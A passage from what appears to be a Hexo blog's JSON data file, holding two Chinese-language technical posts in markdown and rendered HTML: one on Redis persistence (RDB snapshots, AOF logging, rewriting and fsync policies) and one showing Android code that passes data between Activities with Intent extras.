文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。\n- AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。\n\n`缺点`\n- 对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。\n- 根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。\n- AOF 在过去曾经发生过这样的 bug ： 因为个别命令的原因，导致 AOF 文件在重新载入时，无法将数据集恢复成保存时的原样。 （举个例子，阻塞命令 BRPOPLPUSH 就曾经引起过这样的 bug 。） 测试套件里为这种情况添加了测试： 它们会自动生成随机的、复杂的数据集， 并通过重新载入这些数据来确保一切正常。 虽然这种 bug 在 AOF 文件中并不常见， 但是对比来说， RDB 几乎是不可能出现这种 bug 的。\n\n### 无持久化\n通过配置来禁用Redis持久化功能。\n\n### 同时使用RDB和AOF\n\n## RDB快照\n默认情况下RDB的快照文件为`dump.rdb`\n当Redis需要保存dump.rdb时，服务器会进行一下操作:\n1. Redis调用`fork()`, 同时拥有父进程和子进程。\n2. 子进程将数据集写入临时的RDB文件中。\n3. 当子进程完成对新RDB文件的写入时，Redis用新的RDB文件替换旧的RDB文件，并将旧的RDB文件删除。\n\n## AOF重写\n因为AOF采用的是命令追加，因此随着命令的积累，AOF文件会越来越大，Redis就有必要进行AOF重建(rebuild)。\n\n举个例子，用户调用了100次INCR，那么仅仅是为了保存这个计数器的当前值，AOF就需要100条记录(entry)。然而实际上只需要一个`SET`命令保存计数器当前值，其余99条记录都是多余的。\n\n为了处理这种情况，Redis支持一种有趣的特性: 可以在不打断服务器客户端的情况下，对AOF进行重建。执行`BGREWRITEAOF`命令，Redis会生成一个新的AOF文件，这个文件会包含重建当前数据集所需的最少命令。\n\n## AOF fsync\n你可以配置Redis多久才将数据fsync到磁盘一次\n有三个选项:\n- 每次有新命令追加到AOF就进行一次fsync : 非常慢，也非常安全\n- 每秒fsync一次 : 足够块(跟RDB持久化差不多),并且故障只会损失1秒内的数据\n- 从不fsync : 将数据交由操作系统来处理。更快，但也更不安全\n\n通常推荐(也是默认)每秒进行一次fsync，这种策略可以兼顾速度和安全性。\n\n总是fsync的策略在实际使用中非常慢，即使在 Redis 2.0 对相关的程序进行了改进之后仍是如此 —— 频繁调用 fsync 注定了这种策略不可能快得起来。\n\n## AOF运作方式\n1. Redis调用`fork()`, 同时拥有父进程和子进程。\n2. 子进程开始将新的AOF写入临时文件。\n3. 对于新执行的命令，父进程一边将其放入内存缓冲中，一边将这些改动追加到AOF文件末尾 : 这样即使在重写的中途发生停机，现有的AOF还是安全的。\n4. 当子进程完成重写工作时，它给父进程发送一个信号，父进程收到信号后将内存缓冲的所有数据追加到新AOF文件末尾。\n5. Redis原子第将新AOF文件替换旧AOF文件，之后的命令都会追加到新AOF文件末尾。\n\n## 参考链接\n- [http://redisdoc.com/topic/persistence.html](http://redisdoc.com/topic/persistence.html)","slug":"Redis","published":1,"updated":"2018-04-01T14:32:17.195Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscxp000typ0lg5svzqs3","content":"<h2 id=\"持久化方式\"><a href=\"#持久化方式\" class=\"headerlink\" title=\"持久化方式\"></a>持久化方式</h2><h3 id=\"RDB持久化\"><a href=\"#RDB持久化\" class=\"headerlink\" title=\"RDB持久化\"></a>RDB持久化</h3><p>Redis安装后默认支持的持久化方式。在指定的时间间隔内将内存中的数据集快照写入到磁盘。在配置文件中，通常默认的配置是每900秒至少有一个key发生变化时会持久化一次; 每300秒至少有10个key发生变化时会持久化一次; 每60秒10000次变化时持久化一次</p>\n<p><code>优点</code></p>\n<ul>\n<li>RDB 是一个非常紧凑（compact）的文件，它保存了 Redis 在某个时间点上的数据集。 这种文件非常适合用于进行备份： 比如说，你可以在最近的 24 小时内，每小时备份一次 RDB 文件，并且在每个月的每一天，也备份一个 RDB 文件。 这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。</li>\n<li>RDB 非常适用于灾难恢复（disaster recovery）：它只有一个文件，并且内容都非常紧凑，可以（在加密后）将它传送到别的数据中心，或者亚马逊 S3 中</li>\n<li>RDB 可以最大化 Redis 的性能：父进程在保存 RDB 文件时唯一要做的就是 fork 出一个子进程，然后这个子进程就会处理接下来的所有保存工作，父进程无须执行任何磁盘 I/O 操作。</li>\n<li>RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。</li>\n</ul>\n<a id=\"more\"></a>\n<p><code>缺点</code></p>\n<ul>\n<li>如果你需要尽量避免在服务器故障时丢失数据，那么 RDB 不适合你。 虽然 Redis 允许你设置不同的保存点（save point）来控制保存 RDB 文件的频率， 但是， 因为RDB 文件需要保存整个数据集的状态， 所以它并不是一个轻松的操作。 因此你可能会至少 5 分钟才保存一次 RDB 文件。 在这种情况下， 一旦发生故障停机， 你就可能会丢失好几分钟的数据。</li>\n<li>每次保存 RDB 的时候，Redis 都要 fork() 出一个子进程，并由子进程来进行实际的持久化工作。 在数据集比较庞大时， fork() 可能会非常耗时，造成服务器在某某毫秒内停止处理客户端； 如果数据集非常巨大，并且 CPU 时间非常紧张的话，那么这种停止时间甚至可能会长达整整一秒。 虽然 AOF 重写也需要进行 fork() ，但无论 AOF 重写的执行间隔有多长，数据的耐久性都不会有任何损失。</li>\n</ul>\n<h3 id=\"AOF持久化\"><a href=\"#AOF持久化\" class=\"headerlink\" title=\"AOF持久化\"></a>AOF持久化</h3><p>以日志的形式处理服务器所处理的每一个操作，当Redis重启后，它会读取日志文件来重新构建数据库。</p>\n<p><code>优点</code></p>\n<ul>\n<li>使用 AOF 持久化会让 Redis 变得非常耐久（much more durable）：你可以设置不同的 fsync 策略，比如无 fsync ，每秒钟一次 fsync ，或者每次执行写入命令时 fsync 。 AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。</li>\n<li>AOF 文件是一个只进行追加操作的日志文件（append only log）， 因此对 AOF 文件的写入不需要进行 seek ， 即使日志因为某些原因而包含了未写入完整的命令（比如写入时磁盘已满，写入中途停机，等等）， redis-check-aof 工具也可以轻易地修复这种问题。</li>\n<li>Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。</li>\n<li>AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。</li>\n</ul>\n<p><code>缺点</code></p>\n<ul>\n<li>对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。</li>\n<li>根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。</li>\n<li>AOF 在过去曾经发生过这样的 bug ： 因为个别命令的原因，导致 AOF 文件在重新载入时，无法将数据集恢复成保存时的原样。 （举个例子，阻塞命令 BRPOPLPUSH 就曾经引起过这样的 bug 。） 测试套件里为这种情况添加了测试： 它们会自动生成随机的、复杂的数据集， 并通过重新载入这些数据来确保一切正常。 虽然这种 bug 在 AOF 文件中并不常见， 但是对比来说， RDB 几乎是不可能出现这种 bug 的。</li>\n</ul>\n<h3 id=\"无持久化\"><a href=\"#无持久化\" class=\"headerlink\" title=\"无持久化\"></a>无持久化</h3><p>通过配置来禁用Redis持久化功能。</p>\n<h3 id=\"同时使用RDB和AOF\"><a href=\"#同时使用RDB和AOF\" class=\"headerlink\" title=\"同时使用RDB和AOF\"></a>同时使用RDB和AOF</h3><h2 id=\"RDB快照\"><a href=\"#RDB快照\" class=\"headerlink\" title=\"RDB快照\"></a>RDB快照</h2><p>默认情况下RDB的快照文件为<code>dump.rdb</code><br>当Redis需要保存dump.rdb时，服务器会进行一下操作:</p>\n<ol>\n<li>Redis调用<code>fork()</code>, 同时拥有父进程和子进程。</li>\n<li>子进程将数据集写入临时的RDB文件中。</li>\n<li>当子进程完成对新RDB文件的写入时，Redis用新的RDB文件替换旧的RDB文件，并将旧的RDB文件删除。</li>\n</ol>\n<h2 id=\"AOF重写\"><a href=\"#AOF重写\" class=\"headerlink\" title=\"AOF重写\"></a>AOF重写</h2><p>因为AOF采用的是命令追加，因此随着命令的积累，AOF文件会越来越大，Redis就有必要进行AOF重建(rebuild)。</p>\n<p>举个例子，用户调用了100次INCR，那么仅仅是为了保存这个计数器的当前值，AOF就需要100条记录(entry)。然而实际上只需要一个<code>SET</code>命令保存计数器当前值，其余99条记录都是多余的。</p>\n<p>为了处理这种情况，Redis支持一种有趣的特性: 可以在不打断服务器客户端的情况下，对AOF进行重建。执行<code>BGREWRITEAOF</code>命令，Redis会生成一个新的AOF文件，这个文件会包含重建当前数据集所需的最少命令。</p>\n<h2 id=\"AOF-fsync\"><a href=\"#AOF-fsync\" class=\"headerlink\" title=\"AOF fsync\"></a>AOF fsync</h2><p>你可以配置Redis多久才将数据fsync到磁盘一次<br>有三个选项:</p>\n<ul>\n<li>每次有新命令追加到AOF就进行一次fsync : 非常慢，也非常安全</li>\n<li>每秒fsync一次 : 足够块(跟RDB持久化差不多),并且故障只会损失1秒内的数据</li>\n<li>从不fsync : 将数据交由操作系统来处理。更快，但也更不安全</li>\n</ul>\n<p>通常推荐(也是默认)每秒进行一次fsync，这种策略可以兼顾速度和安全性。</p>\n<p>总是fsync的策略在实际使用中非常慢，即使在 Redis 2.0 对相关的程序进行了改进之后仍是如此 —— 频繁调用 fsync 注定了这种策略不可能快得起来。</p>\n<h2 id=\"AOF运作方式\"><a href=\"#AOF运作方式\" class=\"headerlink\" title=\"AOF运作方式\"></a>AOF运作方式</h2><ol>\n<li>Redis调用<code>fork()</code>, 同时拥有父进程和子进程。</li>\n<li>子进程开始将新的AOF写入临时文件。</li>\n<li>对于新执行的命令，父进程一边将其放入内存缓冲中，一边将这些改动追加到AOF文件末尾 : 这样即使在重写的中途发生停机，现有的AOF还是安全的。</li>\n<li>当子进程完成重写工作时，它给父进程发送一个信号，父进程收到信号后将内存缓冲的所有数据追加到新AOF文件末尾。</li>\n<li>Redis原子第将新AOF文件替换旧AOF文件，之后的命令都会追加到新AOF文件末尾。</li>\n</ol>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"http://redisdoc.com/topic/persistence.html\" target=\"_blank\" rel=\"external\">http://redisdoc.com/topic/persistence.html</a></li>\n</ul>\n","excerpt":"<h2 id=\"持久化方式\"><a href=\"#持久化方式\" class=\"headerlink\" title=\"持久化方式\"></a>持久化方式</h2><h3 id=\"RDB持久化\"><a href=\"#RDB持久化\" class=\"headerlink\" title=\"RDB持久化\"></a>RDB持久化</h3><p>Redis安装后默认支持的持久化方式。在指定的时间间隔内将内存中的数据集快照写入到磁盘。在配置文件中，通常默认的配置是每900秒至少有一个key发生变化时会持久化一次; 每300秒至少有10个key发生变化时会持久化一次; 每60秒10000次变化时持久化一次</p>\n<p><code>优点</code></p>\n<ul>\n<li>RDB 是一个非常紧凑（compact）的文件，它保存了 Redis 在某个时间点上的数据集。 这种文件非常适合用于进行备份： 比如说，你可以在最近的 24 小时内，每小时备份一次 RDB 文件，并且在每个月的每一天，也备份一个 RDB 文件。 这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。</li>\n<li>RDB 非常适用于灾难恢复（disaster recovery）：它只有一个文件，并且内容都非常紧凑，可以（在加密后）将它传送到别的数据中心，或者亚马逊 S3 中</li>\n<li>RDB 可以最大化 Redis 的性能：父进程在保存 RDB 文件时唯一要做的就是 fork 出一个子进程，然后这个子进程就会处理接下来的所有保存工作，父进程无须执行任何磁盘 I/O 操作。</li>\n<li>RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。</li>\n</ul>","more":"<p><code>缺点</code></p>\n<ul>\n<li>如果你需要尽量避免在服务器故障时丢失数据，那么 RDB 不适合你。 虽然 Redis 允许你设置不同的保存点（save point）来控制保存 RDB 文件的频率， 但是， 因为RDB 文件需要保存整个数据集的状态， 所以它并不是一个轻松的操作。 因此你可能会至少 5 分钟才保存一次 RDB 文件。 在这种情况下， 一旦发生故障停机， 你就可能会丢失好几分钟的数据。</li>\n<li>每次保存 RDB 的时候，Redis 都要 fork() 出一个子进程，并由子进程来进行实际的持久化工作。 在数据集比较庞大时， fork() 可能会非常耗时，造成服务器在某某毫秒内停止处理客户端； 如果数据集非常巨大，并且 CPU 时间非常紧张的话，那么这种停止时间甚至可能会长达整整一秒。 虽然 AOF 重写也需要进行 fork() ，但无论 AOF 重写的执行间隔有多长，数据的耐久性都不会有任何损失。</li>\n</ul>\n<h3 id=\"AOF持久化\"><a href=\"#AOF持久化\" class=\"headerlink\" title=\"AOF持久化\"></a>AOF持久化</h3><p>以日志的形式处理服务器所处理的每一个操作，当Redis重启后，它会读取日志文件来重新构建数据库。</p>\n<p><code>优点</code></p>\n<ul>\n<li>使用 AOF 持久化会让 Redis 变得非常耐久（much more durable）：你可以设置不同的 fsync 策略，比如无 fsync ，每秒钟一次 fsync ，或者每次执行写入命令时 fsync 。 AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。</li>\n<li>AOF 文件是一个只进行追加操作的日志文件（append only log）， 因此对 AOF 文件的写入不需要进行 seek ， 即使日志因为某些原因而包含了未写入完整的命令（比如写入时磁盘已满，写入中途停机，等等）， redis-check-aof 工具也可以轻易地修复这种问题。</li>\n<li>Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。</li>\n<li>AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。</li>\n</ul>\n<p><code>缺点</code></p>\n<ul>\n<li>对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。</li>\n<li>根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。</li>\n<li>AOF 在过去曾经发生过这样的 bug ： 因为个别命令的原因，导致 AOF 文件在重新载入时，无法将数据集恢复成保存时的原样。 （举个例子，阻塞命令 BRPOPLPUSH 就曾经引起过这样的 bug 。） 测试套件里为这种情况添加了测试： 它们会自动生成随机的、复杂的数据集， 并通过重新载入这些数据来确保一切正常。 虽然这种 bug 在 AOF 文件中并不常见， 但是对比来说， RDB 几乎是不可能出现这种 bug 的。</li>\n</ul>\n<h3 id=\"无持久化\"><a href=\"#无持久化\" class=\"headerlink\" title=\"无持久化\"></a>无持久化</h3><p>通过配置来禁用Redis持久化功能。</p>\n<h3 id=\"同时使用RDB和AOF\"><a href=\"#同时使用RDB和AOF\" class=\"headerlink\" title=\"同时使用RDB和AOF\"></a>同时使用RDB和AOF</h3><h2 id=\"RDB快照\"><a href=\"#RDB快照\" class=\"headerlink\" title=\"RDB快照\"></a>RDB快照</h2><p>默认情况下RDB的快照文件为<code>dump.rdb</code><br>当Redis需要保存dump.rdb时，服务器会进行一下操作:</p>\n<ol>\n<li>Redis调用<code>fork()</code>, 同时拥有父进程和子进程。</li>\n<li>子进程将数据集写入临时的RDB文件中。</li>\n<li>当子进程完成对新RDB文件的写入时，Redis用新的RDB文件替换旧的RDB文件，并将旧的RDB文件删除。</li>\n</ol>\n<h2 id=\"AOF重写\"><a href=\"#AOF重写\" class=\"headerlink\" title=\"AOF重写\"></a>AOF重写</h2><p>因为AOF采用的是命令追加，因此随着命令的积累，AOF文件会越来越大，Redis就有必要进行AOF重建(rebuild)。</p>\n<p>举个例子，用户调用了100次INCR，那么仅仅是为了保存这个计数器的当前值，AOF就需要100条记录(entry)。然而实际上只需要一个<code>SET</code>命令保存计数器当前值，其余99条记录都是多余的。</p>\n<p>为了处理这种情况，Redis支持一种有趣的特性: 可以在不打断服务器客户端的情况下，对AOF进行重建。执行<code>BGREWRITEAOF</code>命令，Redis会生成一个新的AOF文件，这个文件会包含重建当前数据集所需的最少命令。</p>\n<h2 id=\"AOF-fsync\"><a href=\"#AOF-fsync\" class=\"headerlink\" title=\"AOF fsync\"></a>AOF fsync</h2><p>你可以配置Redis多久才将数据fsync到磁盘一次<br>有三个选项:</p>\n<ul>\n<li>每次有新命令追加到AOF就进行一次fsync : 非常慢，也非常安全</li>\n<li>每秒fsync一次 : 足够块(跟RDB持久化差不多),并且故障只会损失1秒内的数据</li>\n<li>从不fsync : 将数据交由操作系统来处理。更快，但也更不安全</li>\n</ul>\n<p>通常推荐(也是默认)每秒进行一次fsync，这种策略可以兼顾速度和安全性。</p>\n<p>总是fsync的策略在实际使用中非常慢，即使在 Redis 2.0 对相关的程序进行了改进之后仍是如此 —— 频繁调用 fsync 注定了这种策略不可能快得起来。</p>\n<h2 id=\"AOF运作方式\"><a href=\"#AOF运作方式\" class=\"headerlink\" title=\"AOF运作方式\"></a>AOF运作方式</h2><ol>\n<li>Redis调用<code>fork()</code>, 同时拥有父进程和子进程。</li>\n<li>子进程开始将新的AOF写入临时文件。</li>\n<li>对于新执行的命令，父进程一边将其放入内存缓冲中，一边将这些改动追加到AOF文件末尾 : 这样即使在重写的中途发生停机，现有的AOF还是安全的。</li>\n<li>当子进程完成重写工作时，它给父进程发送一个信号，父进程收到信号后将内存缓冲的所有数据追加到新AOF文件末尾。</li>\n<li>Redis原子第将新AOF文件替换旧AOF文件，之后的命令都会追加到新AOF文件末尾。</li>\n</ol>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"http://redisdoc.com/topic/persistence.html\">http://redisdoc.com/topic/persistence.html</a></li>\n</ul>"},{"title":"Intent对象使用","date":"2016-06-17T07:18:23.000Z","_content":"\n### 使用Intent对象专递数据\n\n1. 在Activity之间可以通过Intent对象传递数据\n2. 使用putExtra()系列方法向Intent对象当中储存数据\n3. 使用getXXXExtra()系列方法从Intent对象当中取出数据\n\n<!--more-->\n\n### 来个实例吧\n\n**这是第一个Activity代码**\n\n``` bash\npackage com.example.administrator.activitytest;\n\nimport android.content.DialogInterface;\nimport android.content.Intent;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button) findViewById(R.id.button);\n        button.setOnClickListener(new ButtonListener());\n    }\n\n    class ButtonListener implements View.OnClickListener{\n        @Override\n        public void onClick(View v){\n            Intent intent = new Intent();\n            intent.setClass(MainActivity.this,Main2Activity.class);\n            EditText editText = (EditText)findViewById(R.id.editText);\n            String name = editText.getText().toString();\n            intent.putExtra(\"com.example.administrator.activitytest.Name\",name);\n            startActivity(intent);\n        }\n    }\n}\n```\n\n### 这是第二个Activity代码\n``` bash\npackage com.example.administrator.activitytest;\n\nimport android.content.Intent;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.widget.TextView;\n\npublic class Main2Activity extends MainActivity {\n\n    private TextView textView;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main2);\n\n        Intent intent = getIntent();\n        String name = intent.getStringExtra(\"com.example.administrator.activitytest.Name\");\n        textView = (TextView)findViewById(R.id.textView);\n        textView.setText(name);\n    }\n}\n\n```","source":"_posts/android-Intent.md","raw":"---\ntitle: Intent对象使用\ntags: Android Intent\ndate: 2016-06-17 15:18:23\ncategories: Android\n---\n\n### 使用Intent对象专递数据\n\n1. 在Activity之间可以通过Intent对象传递数据\n2. 使用putExtra()系列方法向Intent对象当中储存数据\n3. 使用getXXXExtra()系列方法从Intent对象当中取出数据\n\n<!--more-->\n\n### 来个实例吧\n\n**这是第一个Activity代码**\n\n``` bash\npackage com.example.administrator.activitytest;\n\nimport android.content.DialogInterface;\nimport android.content.Intent;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private Button button;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        button = (Button) findViewById(R.id.button);\n        button.setOnClickListener(new ButtonListener());\n    }\n\n    class ButtonListener implements View.OnClickListener{\n        @Override\n        public void onClick(View v){\n            Intent intent = new Intent();\n            intent.setClass(MainActivity.this,Main2Activity.class);\n            EditText editText = (EditText)findViewById(R.id.editText);\n            String name = editText.getText().toString();\n            intent.putExtra(\"com.example.administrator.activitytest.Name\",name);\n            startActivity(intent);\n        }\n    }\n}\n```\n\n### 这是第二个Activity代码\n``` bash\npackage com.example.administrator.activitytest;\n\nimport android.content.Intent;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.widget.TextView;\n\npublic class Main2Activity extends MainActivity {\n\n    private TextView textView;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main2);\n\n        Intent intent = getIntent();\n        String name = intent.getStringExtra(\"com.example.administrator.activitytest.Name\");\n        textView = (TextView)findViewById(R.id.textView);\n        textView.setText(name);\n    }\n}\n\n```","slug":"android-Intent","published":1,"updated":"2017-11-28T03:01:51.597Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscxu000yyp0l60yyhqna","content":"<h3 id=\"使用Intent对象专递数据\"><a href=\"#使用Intent对象专递数据\" class=\"headerlink\" title=\"使用Intent对象专递数据\"></a>使用Intent对象专递数据</h3><ol>\n<li>在Activity之间可以通过Intent对象传递数据</li>\n<li>使用putExtra()系列方法向Intent对象当中储存数据</li>\n<li>使用getXXXExtra()系列方法从Intent对象当中取出数据</li>\n</ol>\n<a id=\"more\"></a>\n<h3 id=\"来个实例吧\"><a href=\"#来个实例吧\" class=\"headerlink\" title=\"来个实例吧\"></a>来个实例吧</h3><p><strong>这是第一个Activity代码</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.activitytest;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.content.DialogInterface;</span><br><span class=\"line\">import android.content.Intent;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.EditText;</span><br><span class=\"line\"></span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private Button button;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        button = (Button) findViewById(R.id.button);</span><br><span class=\"line\">        button.setOnClickListener(new ButtonListener());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class ButtonListener implements View.OnClickListener&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void onClick(View v)&#123;</span><br><span class=\"line\">            Intent intent = new Intent();</span><br><span class=\"line\">            intent.setClass(MainActivity.this,Main2Activity.class);</span><br><span class=\"line\">            EditText editText = (EditText)findViewById(R.id.editText);</span><br><span class=\"line\">            String name = editText.getText().toString();</span><br><span class=\"line\">            intent.putExtra(<span class=\"string\">\"com.example.administrator.activitytest.Name\"</span>,name);</span><br><span class=\"line\">            startActivity(intent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"这是第二个Activity代码\"><a href=\"#这是第二个Activity代码\" class=\"headerlink\" title=\"这是第二个Activity代码\"></a>这是第二个Activity代码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.administrator.activitytest;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.content.Intent;</span><br><span class=\"line\">import android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.widget.TextView;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Main2Activity extends MainActivity &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private TextView textView;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"built_in\">set</span>ContentView(R.layout.activity_main2);</span><br><span class=\"line\"></span><br><span class=\"line\">        Intent intent = getIntent();</span><br><span class=\"line\">        String name = intent.getStringExtra(<span class=\"string\">\"com.example.administrator.activitytest.Name\"</span>);</span><br><span class=\"line\">        textView = (TextView)findViewById(R.id.textView);</span><br><span class=\"line\">        textView.setText(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","excerpt":"<h3 id=\"使用Intent对象专递数据\"><a href=\"#使用Intent对象专递数据\" class=\"headerlink\" title=\"使用Intent对象专递数据\"></a>使用Intent对象专递数据</h3><ol>\n<li>在Activity之间可以通过Intent对象传递数据</li>\n<li>使用putExtra()系列方法向Intent对象当中储存数据</li>\n<li>使用getXXXExtra()系列方法从Intent对象当中取出数据</li>\n</ol>","more":"<h3 